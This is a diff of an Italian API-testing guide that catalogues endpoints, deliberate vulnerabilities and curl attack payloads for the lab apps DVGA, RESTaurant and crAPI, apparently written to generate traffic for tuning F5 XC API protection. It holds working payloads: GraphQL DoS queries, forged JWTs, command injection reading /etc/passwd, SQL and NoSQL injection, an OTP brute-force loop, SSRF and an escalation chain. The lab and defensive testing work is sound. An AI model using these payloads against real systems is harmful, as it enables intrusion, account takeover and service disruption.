@@ -1,9 +1,9 @@
 ---
-title: Guida al Test delle API
+title: Guida al Testing delle API
 description: >-
   Catalogo completo degli endpoint, mappatura delle vulnerabilità e payload di
   attacco per DVGA, RESTaurant e crAPI — riferimento di onboarding per la
-  generazione del traffico e lo sviluppo dei profili di protezione API F5 XC
+  generazione di traffico e lo sviluppo dei profili di protezione API F5 XC
 sidebar:
   order: 8
 i18n:
@@ -21,7 +21,7 @@ Questa guida cataloga ogni endpoint API, vulnerabilità intenzionale e payload d
 | **RESTaurant** | REST (FastAPI) | `/restaurant/` | 80 | JWT (form-encoded) | 7 categorie OWASP API 2023 |
 | **crAPI** | REST (microservizi) | `/` | 8888 | JWT (Bearer) | 18+ sfide |
 
-### Variabili d'ambiente
+### Variabili d'Ambiente
 
 ```bash
 ORIGIN="http://<ORIGIN_IP>"
@@ -36,9 +36,9 @@ CRAPI="http://<ORIGIN_IP>:8888"
 **IDE GraphiQL:** `GET ${ORIGIN}/dvga/`
 **Credenziali Admin:** admin / password
 
-Tutte le interazioni con DVGA utilizzano un singolo endpoint (`/dvga/graphql`) con richieste POST contenenti payload JSON `{"query":"..."}`.
+Tutte le interazioni DVGA utilizzano un singolo endpoint (`/dvga/graphql`) con richieste POST contenenti payload JSON `{"query":"..."}`.
 
-### Panoramica dello schema
+### Panoramica dello Schema
 
 ```
 Queries:  pastes, paste, me, systemHealth, systemUpdate, systemDiagnostics
@@ -47,21 +47,21 @@ Types:    PasteObject (id, title, content, public, owner, ipAddr, userAgent)
           OwnerObject (id, username, pastes)  ← riferimento circolare
 ```
 
-### Riferimento degli endpoint
+### Riferimento degli Endpoint
 
 | Operazione | Tipo | Auth | Scopo |
 |---|---|---|---|
 | `pastes(public, filter, limit)` | Query | No | Elenco paste (SQL injection tramite filter) |
 | `paste(id)` | Query | No | Ottieni singola paste |
 | `me(token)` | Query | No | Ottieni utente tramite JWT (vulnerabile a falsificazione) |
-| `systemHealth` | Query | No | Controllo stato |
+| `systemHealth` | Query | No | Controllo stato di salute |
 | `systemUpdate` | Query | No | Query lenta (~82s, vettore DoS) |
-| `systemDiagnostics(cmd)` | Query | admin/password | Esegui comandi OS autorizzati |
+| `systemDiagnostics(cmd)` | Query | admin/password | Esecuzione comandi OS nella whitelist |
 | `createPaste(title, content, public)` | Mutation | No | Crea paste (XSS tramite content) |
 | `importPaste(host, port, path, scheme)` | Mutation | No | Importa paste remota (SSRF, command injection) |
 | `uploadPaste(filename, content)` | Mutation | No | Carica paste (path traversal) |
 
-### Catalogo delle vulnerabilità
+### Catalogo delle Vulnerabilità
 
 #### 1. Denial of Service (6 scenari)
 
@@ -72,35 +72,35 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '[{"query":"{systemUpdate}"},{"query":"{systemUpdate}"},{"query":"{systemUpdate}"}]'
 ```
 
-**Ricorsione profonda (riferimenti circolari Owner/Paste):**
+**Ricorsione Profonda (riferimenti circolari Owner/Paste):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{pastes{owner{pastes{owner{pastes{owner{pastes{owner{pastes{title}}}}}}}}}}"}'
 ```
 
-**Query ad alto consumo di risorse (risposta ~82 secondi):**
+**Query ad Alto Consumo di Risorse (risposta ~82 secondi):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{systemUpdate}"}'
 ```
 
-**Duplicazione dei campi (ripetere il campo 500+ volte):**
+**Duplicazione di Campi (ripetere il campo 500+ volte):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{pastes{title title title title title title title title title title title title title title title title title title title title}}"}'
 ```
 
-**Attacco basato su alias (1000 operazioni con alias):**
+**Attacco basato su Alias (1000 operazioni con alias):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{q0:systemUpdate q1:systemUpdate q2:systemUpdate q3:systemUpdate q4:systemUpdate q5:systemUpdate q6:systemUpdate q7:systemUpdate q8:systemUpdate q9:systemUpdate}"}'
 ```
 
-#### 2. Divulgazione di informazioni (5 scenari)
+#### 2. Divulgazione di Informazioni (5 scenari)
 
 **Introspezione (enumerazione completa dello schema):**
 ```bash
@@ -109,14 +109,14 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '{"query":"{__schema{types{name fields{name args{name type{name}}}}}}"}'
 ```
 
-**Suggerimenti sui campi (un errore di battitura rivela campi validi):**
+**Suggerimenti sui Campi (un errore di battitura rivela campi validi):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{pastes{titl}}"}'
 ```
 
-**SSRF tramite importPaste (sondare servizi interni):**
+**SSRF tramite importPaste (sondaggio servizi interni):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -146,7 +146,7 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '{"query":"mutation getPaste{createPaste(title:\"injected\",content:\"hidden mutation\",public:true){paste{id}}}"}'
 ```
 
-#### 4. Esecuzione di codice (3 scenari)
+#### 4. Esecuzione di Codice (3 scenari)
 
 **OS Command Injection tramite importPaste:**
 ```bash
@@ -162,16 +162,16 @@ curl -X POST ${ORIGIN}/dvga/graphql \
   -d '{"query":"{systemDiagnostics(cmd:\"id\")}"}'
 ```
 
-#### 5. Bypass dell'autorizzazione (3 scenari)
+#### 5. Bypass dell'Autorizzazione (3 scenari)
 
-**Falsificazione del token JWT (accetta token non firmati):**
+**Falsificazione Token JWT (accetta token non firmati):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{me(token:\"eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.\"){username}}"}'
 ```
 
-**Scrittura arbitraria di file tramite uploadPaste (path traversal):**
+**Scrittura Arbitraria di File tramite uploadPaste (path traversal):**
 ```bash
 curl -X POST ${ORIGIN}/dvga/graphql \
   -H "Content-Type: application/json" \
@@ -184,10 +184,10 @@ curl -X POST ${ORIGIN}/dvga/graphql \
 
 **Swagger UI:** `${ORIGIN}/restaurant/docs`
 **Specifica OpenAPI:** `${ORIGIN}/restaurant/openapi.json`
-**Auth:** JWT tramite POST form-encoded a `/restaurant/token`
+**Autenticazione:** JWT tramite POST form-encoded a `/restaurant/token`
 **Ruoli:** Customer (predefinito), Employee, Chef (admin)
 
-### Configurazione: Registrazione e autenticazione
+### Configurazione: Registrazione e Autenticazione
 
 ```bash
 # Registra un utente di test
@@ -195,7 +195,7 @@ curl -X POST ${ORIGIN}/restaurant/register \
   -H "Content-Type: application/json" \
   -d '{"username":"attacker","password":"Attack123","first_name":"Test","last_name":"User","phone_number":"5551234567"}'
 
-# Ottieni il token JWT (NOTA: form-encoded, non JSON)
+# Ottieni token JWT (NOTA: form-encoded, non JSON)
 TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "username=attacker&password=Attack123" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
@@ -203,25 +203,25 @@ TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
 echo "Bearer token: ${TOKEN}"
 ```
 
-### Riferimento degli endpoint
+### Riferimento degli Endpoint
 
 | Endpoint | Metodo | Auth | Ruolo | Vulnerabilità |
 |---|---|---|---|---|
 | `/restaurant/register` | POST | No | — | Creazione utente |
 | `/restaurant/token` | POST | No | — | JWT con segreto debole (97952) |
-| `/restaurant/healthcheck` | GET | No | — | Controllo stato |
+| `/restaurant/healthcheck` | GET | No | — | Controllo stato di salute |
 | `/restaurant/profile` | GET | Sì | Qualsiasi | Profilo utente |
 | `/restaurant/profile` | PUT | Sì | Qualsiasi | **BOLA** (modifica altri utenti) |
 | `/restaurant/profile` | PATCH | Sì | Qualsiasi | **BOPLA** (assegnazione massiva del ruolo) |
 | `/restaurant/users/update_role` | PUT | Sì | Qualsiasi | **BFLA** (escalation del ruolo) |
-| `/restaurant/menu` | GET | Sì | Qualsiasi | Elenco voci del menu |
+| `/restaurant/menu` | GET | Sì | Qualsiasi | Elenco voci menu |
 | `/restaurant/menu` | PUT | Sì | Employee+ | Crea menu (**SSRF** tramite immagine) |
 | `/restaurant/menu/{item_id}` | PUT | Sì | Employee+ | Aggiorna menu (**SSRF** tramite immagine) |
 | `/restaurant/menu/{item_id}` | DELETE | Sì | Qualsiasi | **BFLA** (qualsiasi utente può eliminare) |
 | `/restaurant/orders` | GET | Sì | Qualsiasi | **BOLA** (visualizza tutti gli ordini) |
 | `/restaurant/orders` | POST | Sì | Qualsiasi | Crea ordine |
 | `/restaurant/orders/{order_id}` | GET | Sì | Qualsiasi | **BOLA** (accesso ad altri ordini) |
-| `/restaurant/orders/status/{order_id}` | GET | Sì | Qualsiasi | Stato dell'ordine |
+| `/restaurant/orders/status/{order_id}` | GET | Sì | Qualsiasi | Stato ordine |
 | `/restaurant/admin/stats/disk` | GET | Sì | Chef | **Command injection** |
 | `/restaurant/reset-password` | POST | No | — | Richiesta reset password |
 | `/restaurant/reset-password/new-password` | POST | No | — | Imposta nuova password |
@@ -229,11 +229,11 @@ echo "Bearer token: ${TOKEN}"
 | `/restaurant/apply-referral` | POST | Sì | Qualsiasi | Applica referral |
 | `/restaurant/discount-coupons` | GET | Sì | Qualsiasi | Elenco coupon |
 
-### Catalogo delle vulnerabilità
+### Catalogo delle Vulnerabilità
 
 #### API1:2023 — Broken Object Level Authorization (BOLA)
 
-**Modificare il profilo di un altro utente:**
+**Modifica del profilo di un altro utente:**
 ```bash
 curl -X PUT ${ORIGIN}/restaurant/profile \
   -H "Authorization: Bearer ${TOKEN}" \
@@ -241,7 +241,7 @@ curl -X PUT ${ORIGIN}/restaurant/profile \
   -d '{"username":"chef","phone_number":"hacked","first_name":"Pwned","last_name":"User"}'
 ```
 
-**Accedere agli ordini di altri utenti (enumerazione offset):**
+**Accesso agli ordini di altri utenti (enumerazione offset):**
 ```bash
 for i in 1 2 3 4 5; do
   curl -sf ${ORIGIN}/restaurant/orders/${i} \
@@ -250,11 +250,11 @@ for i in 1 2 3 4 5; do
 done
 ```
 
-#### API2:2023 — Autenticazione non funzionante
+#### API2:2023 — Autenticazione Compromessa
 
-**Brute-force del segreto debole JWT (il segreto è a 6 cifre: 97952):**
+**Brute-force del segreto debole JWT (il segreto è di 6 cifre: 97952):**
 ```bash
-# Decodifica e falsifica i token su jwt.io
+# Decodifica e falsifica token su jwt.io
 # Segreto: 97952 (attaccabile con brute-force tramite hashcat -a 3 -m 16500 token '?d?d?d?d?d?d')
 
 # Falsifica un token Chef:
@@ -290,13 +290,13 @@ curl -X PATCH ${ORIGIN}/restaurant/profile \
 
 #### API5:2023 — Broken Function Level Authorization (BFLA)
 
-**Eliminare una voce del menu come Customer (dovrebbe richiedere Employee+):**
+**Eliminazione voce menu come Customer (dovrebbe richiedere Employee+):**
 ```bash
 curl -X DELETE ${ORIGIN}/restaurant/menu/1 \
   -H "Authorization: Bearer ${TOKEN}"
 ```
 
-**Cambiare il ruolo di un altro utente:**
+**Modifica del ruolo di un altro utente:**
 ```bash
 curl -X PUT ${ORIGIN}/restaurant/users/update_role \
   -H "Authorization: Bearer ${TOKEN}" \
@@ -306,9 +306,9 @@ curl -X PUT ${ORIGIN}/restaurant/users/update_role \
 
 #### API7:2023 — Server-Side Request Forgery (SSRF)
 
-**Sondare endpoint interni tramite image_url del menu (richiede ruolo Employee):**
+**Sondaggio endpoint interni tramite image_url del menu (richiede ruolo Employee):**
 ```bash
-# Prima effettuare l'escalation a Employee tramite BOPLA, poi:
+# Prima escalation a Employee tramite BOPLA, poi:
 curl -X PUT ${ORIGIN}/restaurant/menu \
   -H "Authorization: Bearer ${TOKEN}" \
   -H "Content-Type: application/json" \
@@ -327,7 +327,7 @@ curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;cat%20/etc/passwd" \
   -H "Authorization: Bearer ${TOKEN}"
 ```
 
-### Catena di attacco completa: da Customer a Root
+### Catena di Attacco Completa: Da Customer a Root
 
 ```bash
 # 1. Registrazione
@@ -345,7 +345,7 @@ curl -X PATCH ${ORIGIN}/restaurant/profile \
   -H "Content-Type: application/json" \
   -d '{"role":"Chef"}'
 
-# 4. Re-autenticazione per ottenere token di livello Chef
+# 4. Ri-autenticazione per ottenere token di livello Chef
 TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
   -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
 
@@ -360,10 +360,10 @@ curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;id" \
 
 **Interfaccia Web:** `${CRAPI}/`
 **MailHog:** `${CRAPI}/mailhog/` (cattura email per la verifica)
-**Auth:** Token JWT Bearer (RS256, vulnerabile a confusione di algoritmo)
+**Autenticazione:** Token JWT Bearer (RS256, vulnerabile a confusione dell'algoritmo)
 **Architettura:** 7 microservizi (identity, community, workshop, postgres, mongo, mailhog, web)
 
-### Configurazione: Registrazione, verifica email, login
+### Configurazione: Registrazione, Verifica Email, Login
 
 ```bash
 # 1. Registrazione
@@ -371,8 +371,8 @@ curl -X POST ${CRAPI}/identity/api/auth/signup \
   -H "Content-Type: application/json" \
   -d '{"name":"Test User","email":"tester@example.com","number":"5551234567","password":"TestPass123"}'
 
-# 2. Controllare MailHog per l'email di verifica
-# Navigare su ${CRAPI}/mailhog/ o usare l'API di MailHog:
+# 2. Controlla MailHog per l'email di verifica
+# Naviga a ${CRAPI}/mailhog/ o usa l'API MailHog:
 curl -sf ${CRAPI}/mailhog/api/v2/messages | python3 -c "
 import sys,json
 msgs = json.load(sys.stdin)['items']
@@ -380,7 +380,7 @@ for m in msgs:
     print(f\"To: {m['Raw']['To'][0]}, Subject: {m['Content']['Headers']['Subject'][0]}\")
 "
 
-# 3. Login e ottenimento del token JWT
+# 3. Login e ottenimento token JWT
 TOKEN=$(curl -sf -X POST ${CRAPI}/identity/api/auth/login \
   -H "Content-Type: application/json" \
   -d '{"email":"tester@example.com","password":"TestPass123"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")
@@ -388,17 +388,17 @@ TOKEN=$(curl -sf -X POST ${CRAPI}/identity/api/auth/login \
 echo "Bearer token: ${TOKEN}"
 ```
 
-### Riferimento degli endpoint
+### Riferimento degli Endpoint
 
 #### Servizio Identity
 
 | Endpoint | Metodo | Auth | Vulnerabilità |
 |---|---|---|---|
 | `/identity/api/auth/signup` | POST | No | Registrazione |
-| `/identity/api/auth/login` | POST | No | Token JWT (confusione di algoritmo) |
+| `/identity/api/auth/login` | POST | No | Token JWT (confusione dell'algoritmo) |
 | `/identity/api/auth/forget-password` | POST | No | Richiesta OTP |
 | `/identity/api/auth/v2/check-otp` | POST | No | **Nessun rate limit** (brute-force OTP a 4 cifre) |
-| `/identity/api/auth/v3/check-otp` | POST | No | Versione con rate-limit |
+| `/identity/api/auth/v3/check-otp` | POST | No | Versione con rate limit |
 | `/identity/api/v2/user/dashboard` | GET | Sì | Profilo utente |
 | `/identity/api/v2/user/change-email` | PUT | Sì | Cambio email |
 | `/identity/api/v2/vehicle/vehicles` | GET | Sì | Elenco veicoli (espone UUID) |
@@ -421,7 +421,7 @@ echo "Bearer token: ${TOKEN}"
 
 | Endpoint | Metodo | Auth | Vulnerabilità |
 |---|---|---|---|
-| `/workshop/api/mechanic` | GET | Sì | **Esposizione dati** (email dei meccanici) |
+| `/workshop/api/mechanic` | GET | Sì | **Esposizione dati** (email meccanici) |
 | `/workshop/api/mechanic/mechanic_report` | GET | No | **BOLA** (nessuna auth, ID sequenziali) |
 | `/workshop/api/merchant/contact_mechanic` | POST | Sì | **SSRF** + **DoS** |
 | `/workshop/api/shop/products` | GET | Sì | Catalogo prodotti |
@@ -431,12 +431,12 @@ echo "Bearer token: ${TOKEN}"
 | `/workshop/api/shop/orders/{id}` | PUT | Sì | **Mass assignment** (status, quantity) |
 | `/workshop/api/shop/apply_coupon` | POST | Sì | **SQL injection** |
 
-### Catalogo delle sfide
+### Catalogo delle Sfide
 
-#### Sfida 1 — BOLA: Accesso alla posizione del veicolo di un altro utente
+#### Sfida 1 — BOLA: Accesso alla Posizione del Veicolo di un Altro Utente
 
 ```bash
-# Ottieni prima il tuo UUID del veicolo
+# Ottieni prima l'UUID del tuo veicolo
 curl -sf ${CRAPI}/identity/api/v2/vehicle/vehicles \
   -H "Authorization: Bearer ${TOKEN}"
 
@@ -445,7 +445,7 @@ curl -sf ${CRAPI}/identity/api/v2/vehicle/VICTIM-UUID-HERE/location \
   -H "Authorization: Bearer ${TOKEN}"
 ```
 
-#### Sfida 2 — BOLA: Accesso ai report dei meccanici (senza auth)
+#### Sfida 2 — BOLA: Accesso ai Report dei Meccanici (Senza Auth)
 
 ```bash
 # Enumerazione ID sequenziali — nessun token necessario
@@ -456,7 +456,7 @@ for i in 1 2 3 4 5; do
 done
 ```
 
-#### Sfida 3 — Autenticazione non funzionante: Brute-force dell'OTP per il reset password
+#### Sfida 3 — Autenticazione Compromessa: Brute-Force dell'OTP per Reset Password
 
 ```bash
 # Richiedi OTP per la vittima
@@ -464,7 +464,7 @@ curl -X POST ${CRAPI}/identity/api/auth/forget-password \
   -H "Content-Type: application/json" \
   -d '{"email":"victim@example.com"}'
 
-# Brute-force dell'OTP a 4 cifre (v2 NON ha rate limiting)
+# Brute-force OTP a 4 cifre (v2 NON ha rate limiting)
 for otp in $(seq -w 0000 9999); do
   RESULT=$(curl -sf -X POST ${CRAPI}/identity/api/auth/v2/check-otp \
     -H "Content-Type: application/json" \
@@ -473,14 +473,14 @@ for otp in $(seq -w 0000 9999); do
 done
 ```
 
-#### Sfida 4 — Esposizione dati: Estrazione email dei meccanici
+#### Sfida 4 — Esposizione Dati: Esfiltrare Email dei Meccanici
 
 ```bash
 curl -sf ${CRAPI}/workshop/api/mechanic \
   -H "Authorization: Bearer ${TOKEN}" | python3 -m json.tool
 ```
 
-#### Sfida 5 — Esposizione dati: Parametri interni di conversione video
+#### Sfida 5 — Esposizione Dati: Parametri Interni di Conversione Video
 
 ```bash
 # Carica un video, poi ispeziona la risposta
@@ -505,7 +505,7 @@ curl -X POST ${CRAPI}/workshop/api/merchant/contact_mechanic \
   }'
 ```
 
-#### Sfida 7 — BFLA: Eliminazione video tramite endpoint admin
+#### Sfida 7 — BFLA: Eliminazione Video tramite Endpoint Admin
 
 ```bash
 # Un utente normale può accedere all'endpoint admin
@@ -513,7 +513,7 @@ curl -X DELETE ${CRAPI}/identity/api/v2/admin/videos/VIDEO_ID_HERE \
   -H "Authorization: Bearer ${TOKEN}"
 ```
 
-#### Sfide 8 e 9 — Mass Assignment: Articoli gratuiti tramite manipolazione ordini
+#### Sfide 8 e 9 — Mass Assignment: Articoli Gratuiti tramite Manipolazione Ordini
 
 ```bash
 # Cambia GET in PUT, modifica status e quantity
@@ -523,7 +523,7 @@ curl -X PUT ${CRAPI}/workshop/api/shop/orders/1 \
   -d '{"status":"returned","quantity":100}'
 ```
 
-#### Sfida 10 — Command Injection tramite parametri di conversione video
+#### Sfida 10 — Command Injection tramite Parametri di Conversione Video
 
 ```bash
 curl -X PUT ${CRAPI}/identity/api/v2/user/videos/VIDEO_ID \
@@ -548,7 +548,7 @@ curl -X POST ${CRAPI}/workshop/api/merchant/contact_mechanic \
   }'
 ```
 
-#### Sfida 12 — NoSQL Injection: Estrazione codici coupon
+#### Sfida 12 — NoSQL Injection: Estrazione Codici Coupon
 
 ```bash
 curl -X POST ${CRAPI}/community/api/v2/coupon/validate-coupon \
@@ -557,7 +557,7 @@ curl -X POST ${CRAPI}/community/api/v2/coupon/validate-coupon \
   -d '{"coupon_code":{"$ne":1}}'
 ```
 
-#### Sfida 13 — SQL Injection: Riscatto coupon multiplo
+#### Sfida 13 — SQL Injection: Riscatto Multiplo dei Coupon
 
 ```bash
 curl -X POST ${CRAPI}/workshop/api/shop/apply_coupon \
@@ -566,7 +566,7 @@ curl -X POST ${CRAPI}/workshop/api/shop/apply_coupon \
   -d "{\"coupon_code\":\"TRAC075' OR '1'='1\"}"
 ```
 
-#### Sfida 14 — Accesso agli ordini senza autenticazione
+#### Sfida 14 — Accesso agli Ordini Senza Autenticazione
 
 ```bash
 # Nessun header Authorization — restituisce comunque i dati
@@ -576,7 +576,7 @@ for i in 1 2 3 4 5; do
 done
 ```
 
-#### Sfida 15 — Confusione dell'algoritmo JWT
+#### Sfida 15 — Confusione dell'Algoritmo JWT
 
 ```bash
 # Falsifica un JWT con algoritmo "none" (nessuna verifica della firma):
@@ -593,29 +593,29 @@ curl -sf ${CRAPI}/identity/api/v2/user/dashboard \
 
 ---
 
-## Riferimento incrociato OWASP API Security Top 10
+## Riferimento Incrociato OWASP API Security Top 10
 
 | Categoria OWASP | DVGA | RESTaurant | crAPI |
 |---|---|---|---|
 | **API1: BOLA** | — | `PUT /profile`, `GET /orders/{id}` | Posizione veicolo, report meccanici, ordini |
-| **API2: Autenticazione non funzionante** | Falsificazione JWT (query `me`) | Segreto JWT debole (97952) | Brute-force OTP (v2), confusione algoritmo JWT |
+| **API2: Autenticazione Compromessa** | Falsificazione JWT (query `me`) | Segreto JWT debole (97952) | Brute-force OTP (v2), confusione algoritmo JWT |
 | **API3: BOPLA** | — | `PATCH /profile` (escalation del ruolo) | Video conversion_params, esposizione email meccanici |
-| **API4: Consumo risorse** | DoS tramite batch, ricorsione, alias, duplicazione campi | Enumerazione utenti tramite lunghezza risposta | DoS `contact_mechanic` repeat_request |
+| **API4: Consumo di Risorse** | Batch, ricorsione, alias, duplicazione campi DoS | Enumerazione utenti tramite lunghezza risposta | `contact_mechanic` repeat_request DoS |
 | **API5: BFLA** | — | `DELETE /menu`, `PUT /users/update_role` | `DELETE /admin/videos` come utente normale |
-| **API6: Mass Assignment** | — | `PUT /orders` (status, quantity) | Status/quantità ordini, video conversion_params |
-| **API7: SSRF** | Mutation `importPaste` | `PUT /menu` image_url | URL `contact_mechanic` mechanic_api |
+| **API6: Mass Assignment** | — | `PUT /orders` (status, quantity) | Status/quantity ordine, video conversion_params |
+| **API7: SSRF** | Mutation `importPaste` | `PUT /menu` image_url | `contact_mechanic` URL mechanic_api |
 | **API8: Injection** | SQL (`filter`), XSS (`content`), OS cmd (`importPaste`, `systemDiagnostics`) | OS cmd (`/admin/stats/disk?parameters=`) | NoSQL (`validate-coupon`), SQL (`apply_coupon`) |
-| **API9: Gestione asset impropria** | — | — | `/auth/v2/check-otp` deprecato (nessun rate limit) |
-| **API10: Consumo non sicuro** | — | — | (indiretto tramite SSRF) |
+| **API9: Gestione Impropria degli Asset** | — | — | `/auth/v2/check-otp` deprecato (nessun rate limit) |
+| **API10: Consumo Non Sicuro** | — | — | (indiretto tramite SSRF) |
 | **Specifico GraphQL** | Introspezione, batching, ricorsione, alias, duplicazione campi, frammenti circolari | — | — |
 
 ---
 
-## Pattern di generazione del traffico
+## Pattern di Generazione del Traffico
 
-### Fase 1: Baseline (percorso standard)
+### Fase 1: Baseline (Percorso Felice)
 
-Generare traffico legittimo per stabilire il comportamento normale dell'API prima di testare i pattern di attacco.
+Genera traffico legittimo per stabilire il comportamento normale dell'API prima di testare i pattern di attacco.
 
 **Baseline DVGA:**
 ```bash
@@ -638,33 +638,33 @@ curl -sf ${CRAPI}/workshop/api/shop/products -H "Authorization: Bearer ${TOKEN}"
 curl -sf ${CRAPI}/community/api/v2/community/posts -H "Authorization: Bearer ${TOKEN}"
 ```
 
-### Fase 2: Traffico di attacco per categoria OWASP
+### Fase 2: Traffico di Attacco per Categoria OWASP
 
 **Test BOLA:** Enumerare ID sequenziali, scambiare identificatori utente nelle richieste, accedere a risorse senza proprietà.
 
-**Test injection:** Payload SQL nei parametri filter/coupon, injection nelle query GraphQL, OS command injection tramite campi parametro.
+**Test Injection:** Payload SQL nei parametri filter/coupon, injection nelle query GraphQL, OS command injection tramite campi parametro.
 
-**Test bypass autenticazione:** Falsificare token JWT, brute-force degli OTP, utilizzare versioni API deprecate, confusione di algoritmo.
+**Test bypass autenticazione:** Falsificazione token JWT, brute-force OTP, utilizzo di versioni API deprecate, confusione dell'algoritmo.
 
 **Test SSRF:** URL interni nei parametri `importPaste`, `image_url` e `mechanic_api`.
 
 **Test DoS:** Attacchi GraphQL batch/ricorsione/alias, `repeat_request_if_failed` con conteggi elevati.
 
-### Fase 3: Catene di attacco stateful
+### Fase 3: Catene di Attacco Stateful
 
 Alcuni attacchi richiedono sequenze multi-step con stato:
 
-1. **Catena di escalation RESTaurant:** Registrazione → Token → PATCH ruolo a Chef → Re-auth → Command injection
-2. **Flusso completo crAPI:** Registrazione → Verifica email (MailHog) → Login → Aggiungi veicolo → Contatta meccanico (SSRF) → Manipolazione ordini
-3. **DVGA da ricognizione a exploit:** Introspezione → Scoperta systemDiagnostics → Brute-force credenziali admin → Esecuzione comandi OS
+1. **Catena di escalation RESTaurant:** Registrazione → Token → PATCH ruolo a Chef → Ri-autenticazione → Command injection
+2. **Flusso completo crAPI:** Signup → Verifica email (MailHog) → Login → Aggiungi veicolo → Contatta meccanico (SSRF) → Manipolazione ordini
+3. **Da ricognizione a exploit DVGA:** Introspezione → Scoperta systemDiagnostics → Brute-force credenziali admin → Esecuzione comandi OS
 
-### Raccomandazioni sulle frequenze
+### Raccomandazioni sulle Frequenze
 
 | Pattern | Richieste/sec | Durata | Note |
 |---|---|---|---|
 | Baseline (per app) | 10-50 | 5 min | Stabilire l'impronta del traffico normale |
 | Enumerazione BOLA | 100-500 | 2 min | Scansione ID sequenziali |
-| Brute-force OTP | 1000+ | Fino al ritrovamento | 10.000 tentativi massimi (4 cifre) |
+| Brute-force OTP | 1000+ | Fino al trovamento | 10.000 tentativi massimi (4 cifre) |
 | DoS GraphQL | 10-50 | 30 sec | Ogni richiesta è costosa lato server |
 | Fuzzing injection | 50-200 | 5 min | Variare i payload per richiesta |
 | Sondaggio SSRF | 5-20 | 2 min | Lento; ogni richiesta attiva una richiesta HTTP lato server |
